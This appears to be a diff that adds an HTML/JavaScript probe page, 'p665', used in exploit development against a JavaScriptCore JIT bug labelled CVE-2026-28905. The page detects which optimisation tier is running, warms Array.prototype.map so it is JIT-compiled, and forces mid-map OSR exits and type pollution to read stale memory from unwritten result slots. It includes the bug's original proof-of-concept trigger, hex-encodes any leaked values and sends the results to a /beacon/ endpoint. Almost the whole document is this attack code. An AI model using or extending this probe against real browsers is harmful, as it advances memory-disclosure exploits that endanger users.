@@ -1,0 +1,311 @@
+<!--
+  p665: Confirm FTL presence + correct OSR exit test for CVE-2026-28905
+  
+  p663/p664 were FALSE POSITIVES: the "leaked" objects were normal
+  map callback return values, not stale butterfly data.
+  
+  This probe:
+  A) Definitively test for FTL via optimization-tier-specific behavior
+  B) Force a REAL mid-map OSR exit where some slots are unwritten
+  C) Check if unwritten slots contain holes (patched) or stale data (vuln)
+  
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p665</title></head>
+<body>p665: FTL confirm + real OSR exit
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=3)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,4).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P665-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: FTL detection via tier-specific optimization behavior
+// FTL does aggressive dead-code elimination and escape analysis
+// that DFG does not. Test if these optimizations are present.
+// ================================================================
+emit('A','ftl-detection');
+try{
+  // Test 1: Escape analysis. FTL can eliminate allocations that don't escape.
+  // DFG cannot. Measure allocation pressure.
+  var before=Date.now();
+  function escapeTest(){
+    var obj={x:0,y:0};
+    obj.x=1; obj.y=2;
+    return obj.x+obj.y;
+  }
+  for(var i=0;i<100000;i++) escapeTest();
+  var escapeTime=Date.now()-before;
+
+  // Test 2: Compare with allocation that DOES escape
+  var escaped=[];
+  var before2=Date.now();
+  function noEscapeTest(){
+    var obj={x:0,y:0};
+    obj.x=1; obj.y=2;
+    escaped.push(obj); // forces allocation to survive
+    return obj.x+obj.y;
+  }
+  for(var i=0;i<100000;i++) noEscapeTest();
+  var noEscapeTime=Date.now()-before2;
+  escaped=null;
+
+  var ratio=noEscapeTime>0?(escapeTime/noEscapeTime):1;
+  emit('A-ESCAPE','noAlloc='+escapeTime+'ms,alloc='+noEscapeTime+'ms,ratio='+ratio.toFixed(3));
+  // FTL with escape analysis: ratio < 0.3 (allocation eliminated)
+  // DFG only: ratio ~ 0.8-1.0 (both allocate)
+  if(ratio<0.3) emit('A-VERDICT','FTL-CONFIRMED (escape analysis active)');
+  else if(ratio<0.6) emit('A-VERDICT','FTL-POSSIBLE (partial optimization)');
+  else emit('A-VERDICT','DFG-ONLY (no escape analysis, ratio='+ratio.toFixed(3)+')');
+
+  // Test 3: Measure at higher iteration counts (FTL kicks in at ~5000-10000)
+  function sumLoop(n){var s=0;for(var i=0;i<n;i++)s=(s+i)|0;return s;}
+  // DFG warmup
+  for(var i=0;i<500;i++) sumLoop(100);
+  var t1=Date.now();
+  sumLoop(10000000);
+  var dgfMs=Date.now()-t1;
+  // FTL warmup
+  for(var i=0;i<20000;i++) sumLoop(100);
+  var t2=Date.now();
+  sumLoop(10000000);
+  var ftlMs=Date.now()-t2;
+  emit('A-LOOP','dfg='+dgfMs+'ms,ftl='+ftlMs+'ms');
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: CORRECT test for CVE-2026-28905
+// Force a mid-map OSR exit so some result slots are NEVER written.
+// Then check if those slots are holes or stale data.
+// ================================================================
+emit('B','correct-osr-exit-test');
+try{
+  var staleFound=0, holeFound=0, normalFound=0;
+  var staleTypes={};
+
+  function triggerOSR(arr, triggerIdx) {
+    var callCount=0;
+    var result = arr.map(function(elem) {
+      callCount++;
+      if(callCount === triggerIdx) {
+        // Force OSR exit by changing type expectations
+        // Access a property that doesn't exist on a number
+        // This should cause a type speculation failure
+        return arguments[2]; // 3rd arg of map callback = the array
+      }
+      return elem * 2;
+    });
+    return {result: result, calls: callCount};
+  }
+
+  // Warm with consistent behavior (all callbacks return number)
+  for(var i=0;i<3000;i++){
+    var warmArr=[1,2,3,4,5,6,7,8,9,10];
+    triggerOSR(warmArr, 999); // triggerIdx=999 → never triggers
+  }
+
+  // Now trigger OSR exit at various positions
+  for(var trial=0;trial<50;trial++){
+    var testArr=[1,2,3,4,5,6,7,8,9,10];
+    var exitAt=3+trial%5; // exit at position 3-7
+    var out=triggerOSR(testArr, exitAt);
+    var r=out.result;
+
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      if(j<exitAt-1){
+        // Should be elem*2 (number)
+        if(typeof v==='number') normalFound++;
+      } else if(j===exitAt-1){
+        // Should be the array itself (we returned arguments[2])
+        // This forces a type change: prior returns were numbers, this is an object
+      } else {
+        // Post-exit slots: should be holes (undefined) if patched,
+        // or stale data if vulnerable
+        if(v===undefined){
+          holeFound++;
+        } else {
+          staleFound++;
+          var t=typeof v;
+          staleTypes[t]=(staleTypes[t]||0)+1;
+        }
+      }
+    }
+  }
+
+  emit('B-RESULT','stale='+staleFound+',holes='+holeFound+',normal='+normalFound);
+  var typeStr=[];
+  for(var k in staleTypes) typeStr.push(k+':'+staleTypes[k]);
+  emit('B-TYPES',typeStr.join(',') || 'none');
+
+  if(staleFound>0) emit('B-VERDICT','STALE-DATA-IN-UNWRITTEN-SLOTS — CVE LIVE');
+  else if(holeFound>0) emit('B-VERDICT','HOLES-IN-UNWRITTEN-SLOTS — patched or DFG-only');
+  else emit('B-VERDICT','no-unwritten-slots-detected');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Alternative OSR exit via type pollution
+// Warm map with doubles, then pass an object to trigger OSR exit
+// ================================================================
+emit('C','type-pollution-osr');
+try{
+  var leaksC=[];
+
+  function mapDouble(arr){
+    return arr.map(function(x){return x+0.1;});
+  }
+
+  // Warm with doubles
+  for(var i=0;i<5000;i++) mapDouble([1.1,2.2,3.3,4.4,5.5,6.6,7.7]);
+
+  // Now poison: pass an array where one element is an object
+  var poisoned=[1.1,2.2,{valueOf:function(){return 3.3;}},4.4,5.5,6.6,7.7];
+  for(var trial=0;trial<100;trial++){
+    var r=mapDouble(poisoned);
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      if(typeof v!=='number' || (v!==r[j] && isNaN(v))){
+        leaksC.push({trial:trial,j:j,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A'});
+      }
+      // Check for unexpected values (not x+0.1 pattern)
+      var expected=[1.2,2.3,3.4,4.5,5.6,6.7,7.8];
+      if(typeof v==='number'&& Math.abs(v-expected[j])>0.001 && v!==0){
+        leaksC.push({trial:trial,j:j,val:v,hex:d2hex(v),note:'unexpected-val'});
+      }
+    }
+  }
+
+  emit('C-RESULT','anomalies='+leaksC.length);
+  for(var k=0;k<Math.min(leaksC.length,8);k++){
+    var lv=leaksC[k];
+    emit('C-LEAK','t='+lv.trial+',j='+lv.j+',type='+(lv.type||'')+',hex='+(lv.hex||'')+','+(lv.note||''));
+  }
+  if(leaksC.length>0) emit('C-VERDICT','ANOMALY-DETECTED');
+  else emit('C-VERDICT','clean-no-type-confusion');
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: hasOwnProperty check on map result
+// If unwritten slots are stale data (not holes), hasOwnProperty returns true
+// If they are holes, hasOwnProperty returns false
+// This is the DEFINITIVE test
+// ================================================================
+emit('D','hasown-hole-test');
+try{
+  function optHole(){
+    var arr=[0,0,0,0,0,0,0];
+    function f(){
+      arr[0];
+      (0)[0]; // original PoC trigger
+      return arr;
+    }
+    var ret=arr.map(f);
+    ret[0]=1;
+    return ret;
+  }
+  for(var i=0;i<3000;i++) optHole();
+
+  // Check hasOwnProperty on result slots
+  var hasOwn=[], noOwn=[];
+  for(var trial=0;trial<50;trial++){
+    var r=optHole();
+    for(var j=0;j<r.length;j++){
+      if(r.hasOwnProperty(j)){
+        hasOwn.push(j);
+      } else {
+        noOwn.push(j);
+      }
+    }
+  }
+
+  emit('D-RESULT','hasOwn='+hasOwn.length+',noOwn='+noOwn.length);
+  // If bug present: ALL slots have own property (stale data treated as values)
+  // If fixed/DFG: unwritten slots are holes → hasOwnProperty returns false
+  // If normal map: all slots written by callback → all have own property
+
+  if(noOwn.length>0){
+    emit('D-VERDICT','HOLES-FOUND — '+noOwn.length+' slots without own property');
+    // This means the map didn't write all slots → OSR exit happened
+    // Check what's in those holes
+    var r2=optHole();
+    for(var j=0;j<r2.length;j++){
+      if(!r2.hasOwnProperty(j)){
+        emit('D-HOLE','idx='+j+',val='+r2[j]+',typeof='+typeof r2[j]);
+      }
+    }
+  } else {
+    emit('D-VERDICT','ALL-OWN — no holes (all callbacks completed, no mid-map OSR exit)');
+  }
+
+  // Also test: does the result array have the right length?
+  var r3=optHole();
+  emit('D-LEN','length='+r3.length+',keys='+Object.keys(r3).length);
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: Definitive FTL test — optimization tiers via Function.toString
+// and JIT compilation counters
+// ================================================================
+emit('E','jit-tier-diagnostic');
+try{
+  // Test: does the engine have FTL-only optimizations?
+  // Method: create a function where FTL would produce different code than DFG
+  
+  // FTL does LICM (Loop Invariant Code Motion) more aggressively than DFG
+  var obj={x:1};
+  function licmTest(){
+    var sum=0;
+    for(var i=0;i<1000;i++){
+      sum+=obj.x; // obj.x is loop-invariant
+    }
+    return sum;
+  }
+  
+  // Warm
+  for(var i=0;i<20000;i++) licmTest();
+  
+  // Time: FTL hoists obj.x read outside loop (1 read + 1000 adds)
+  // DFG reads obj.x each iteration (1000 reads + 1000 adds)
+  var t1=Date.now();
+  for(var i=0;i<10000;i++) licmTest();
+  var licmTime=Date.now()-t1;
+  
+  // Compare with version where LICM can't apply
+  var objs=[{x:1},{x:1}];
+  function noLicmTest(){
+    var sum=0;
+    for(var i=0;i<1000;i++){
+      sum+=objs[i%2].x; // NOT loop-invariant
+    }
+    return sum;
+  }
+  for(var i=0;i<20000;i++) noLicmTest();
+  var t2=Date.now();
+  for(var i=0;i<10000;i++) noLicmTest();
+  var noLicmTime=Date.now()-t2;
+  
+  var licmRatio=noLicmTime>0?(licmTime/noLicmTime):1;
+  emit('E-LICM','invariant='+licmTime+'ms,variant='+noLicmTime+'ms,ratio='+licmRatio.toFixed(3));
+  
+  // Summary
+  emit('E-SUMMARY','FTL indicators: escape=Phase-A, LICM-ratio='+licmRatio.toFixed(3));
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p665-complete');
+flush();
+})();
+</script>
+</body>
+</html>
